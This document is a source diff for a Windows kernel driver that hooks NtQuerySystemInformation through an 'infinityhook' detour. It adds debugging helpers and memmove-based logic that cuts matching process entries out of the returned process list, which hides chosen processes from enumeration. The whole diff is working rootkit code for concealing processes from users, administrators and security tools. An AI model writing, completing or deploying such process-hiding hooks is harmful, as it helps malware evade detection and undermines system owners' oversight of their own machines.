@@ -31,6 +31,18 @@ typedef struct _SYSTEM_PROCESS_INFORMATION {
     LARGE_INTEGER Reserved7[6];
 } SYSTEM_PROCESS_INFORMATION;
 
+typedef struct _SYSTEM_THREAD_INFORMATION {
+	LARGE_INTEGER Reserved1[3];
+	ULONG Reserved2;
+	PVOID StartAddress;
+	CLIENT_ID ClientId;
+	KPRIORITY Priority;
+	LONG BasePriority;
+	ULONG Reserved3;
+	ULONG ThreadState;
+	ULONG WaitReason;
+} SYSTEM_THREAD_INFORMATION;
+
 typedef NTSTATUS(*NtQuerySystemInformation_t)(
 	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
 	_Out_ PVOID SystemInformation,
@@ -52,6 +64,28 @@ ULONG GetLastEntrySize(ULONG ReturnLength, SYSTEM_PROCESS_INFORMATION* CurrentEn
 	return LastEntrySize;
 }
 
+void PrintProcessStructInfo(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr, ULONG BufferLeftOffset) {
+	WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
+	const wchar_t* RealProcessNameBufferAddr;
+
+	if (ProcessInformationPtr->NextEntryOffset > 0) // shift if not last process
+		RealProcessNameBufferAddr = (wchar_t*)((PUINT8)(ProcessInformationPtr->ImageName.Buffer) - BufferLeftOffset); // shift value is in bytes, so we retype to PUINT8 to be able to do pointer arithmetic
+	else
+		RealProcessNameBufferAddr = ProcessInformationPtr->ImageName.Buffer;
+
+	wcsncpy(ProcessNameBuffer, RealProcessNameBufferAddr, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER - 1)); // -1 to ensure that the last char is \0
+	kprintf("[+] syshooker: PrintProcessStructInfo (offset %d): Struct addr: %p, Process Name: %ws, Process Name buffer addr original: %p, shifted buffer: %p, NextEntryOffset: %d, threadcount: %d, thread struct size: %d\n", BufferLeftOffset, ProcessInformationPtr,  ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, RealProcessNameBufferAddr, ProcessInformationPtr->NextEntryOffset, ProcessInformationPtr->NumberOfThreads, sizeof(SYSTEM_THREAD_INFORMATION));
+}
+
+void PrintAllProcessEntries(SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr) {
+	kprintf("[+] syshooker: printing ALL entries\n");
+	while (ProcessInformationPtr->NextEntryOffset != 0) {
+		ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset); // move forward
+		PrintProcessStructInfo(ProcessInformationPtr, 0);
+	}
+	kprintf("[+] syshooker: done with printing ALL entries\n");
+}
+
 NTSTATUS DetourNtQuerySystemInformation(
 	_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass,
 	_Out_ PVOID SystemInformation,
@@ -60,20 +94,35 @@ NTSTATUS DetourNtQuerySystemInformation(
 {
 	NTSTATUS OriginalStatus = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 	
-	if (NT_SUCCESS(OriginalStatus) && SystemInformationClass == SYSHOOKER_SYSTEM_INFORMATION_CLASS_PROCESS) {		
-		kprintf("[+] infinityhook: NtQuerySystemInformation: SystemInformationClass: %d\n", SystemInformationClass);
-		kprintf("[+] infinityhook: NtQuerySystemInformation: returnLength: %d\n", *ReturnLength);
+	if (NT_SUCCESS(OriginalStatus) && SystemInformationClass == SYSHOOKER_SYSTEM_INFORMATION_CLASS_PROCESS) {
+		ULONG RemovedBytesOffset = 0;
+		kprintf("[+] infinityhook: NtQuerySystemInformation: SystemInformationClass: %d, SystemInformationLength: %d, Buffer beginning addr: %p\n", SystemInformationClass, SystemInformationLength, SystemInformation);
+		if (ReturnLength) {
+			kprintf("[+] infinityhook: NtQuerySystemInformation: returnLength: %d\n", *ReturnLength);
+		}
+		else {
+			kprintf("[-] infinityhook: NtQuerySystemInformation: returnLength is null: %p\n", ReturnLength);
+		}
 
         SYSTEM_PROCESS_INFORMATION* ProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
 		SYSTEM_PROCESS_INFORMATION* PreviousProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
 
         if (ProcessInformationPtr) {
-			ULONG LastEntrySize = GetLastEntrySize(*ReturnLength, ProcessInformationPtr);
+			ULONG LastEntrySize;
+			if (ReturnLength) {
+				LastEntrySize = GetLastEntrySize(*ReturnLength, ProcessInformationPtr);
+			}
+			else {
+				LastEntrySize = 0;
+			}
+
+			PrintAllProcessEntries(ProcessInformationPtr);
+
             while (1) {
                 //kprintf("[+] infinityhook: NtQuerySystemInformation: PID: %d\n", ProcessInformationPtr->UniqueProcessId);
+				PrintProcessStructInfo(ProcessInformationPtr, RemovedBytesOffset);
                 WCHAR ProcessNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
                 wcsncpy(ProcessNameBuffer, ProcessInformationPtr->ImageName.Buffer, MIN(ProcessInformationPtr->ImageName.Length, MAX_PATH_SYSHOOKER-1)); // -1 to ensure that the last char is \0
-                kprintf("[+] infinityhook: NtQuerySystemInformation: Process Name: %ws, NextEntryOffset: %d, struct size: %d\n", ProcessNameBuffer, ProcessInformationPtr->NextEntryOffset, sizeof(SYSTEM_PROCESS_INFORMATION));
 
 				//if (wcsstr(ProcessNameBuffer, Settings.NtQuerySystemInformationProcessMagicName)) {
 					//kprintf("[+] infinityhook: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
@@ -85,6 +134,7 @@ NTSTATUS DetourNtQuerySystemInformation(
 					kprintf("[+] infinityhook: NtQuerySystemInformation: Should hide: %ws\n", ProcessNameBuffer);
 					// Not the last one
 					if (ProcessInformationPtr->NextEntryOffset > 0) {
+
 						// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
 
 						// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
@@ -95,12 +145,22 @@ NTSTATUS DetourNtQuerySystemInformation(
 							TempProcessInformationPtr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)TempProcessInformationPtr + TempProcessInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
 						}
 						// last record size
-						ProcessInformationBufferSizeToEnd += LastEntrySize;
+						//ProcessInformationBufferSizeToEnd += LastEntrySize; // TODO - do something smarter here
+						ProcessInformationBufferSizeToEnd += sizeof(SYSTEM_PROCESS_INFORMATION); // after this there are n thread structs and process name itself
 
 						// next structure address - start copying from there
 						SYSTEM_PROCESS_INFORMATION* NextProcessInformationStructAddr = (SYSTEM_PROCESS_INFORMATION*)((PUINT8)ProcessInformationPtr + ProcessInformationPtr->NextEntryOffset);
 
-						memcpy(ProcessInformationPtr, NextProcessInformationStructAddr, ProcessInformationBufferSizeToEnd);
+						kprintf("[+] syshooker: memmove: dst %p, src %p, bytescount %d\n", ProcessInformationPtr, NextProcessInformationStructAddr, ProcessInformationBufferSizeToEnd);
+						kprintf("[+] syshooker: before memmove\n");
+						PrintProcessStructInfo(NextProcessInformationStructAddr, RemovedBytesOffset);
+
+						// memmove memory and note that the buffer was 'shifted left' NextEntryOffset bytes
+						RemovedBytesOffset += ProcessInformationPtr->NextEntryOffset;
+						memmove(ProcessInformationPtr, NextProcessInformationStructAddr, ProcessInformationBufferSizeToEnd);
+
+						kprintf("[+] syshooker: after memmove\n");
+						PrintProcessStructInfo(ProcessInformationPtr, RemovedBytesOffset);
 
 						continue; // handle the same structure address next (because it was moved)
 					}
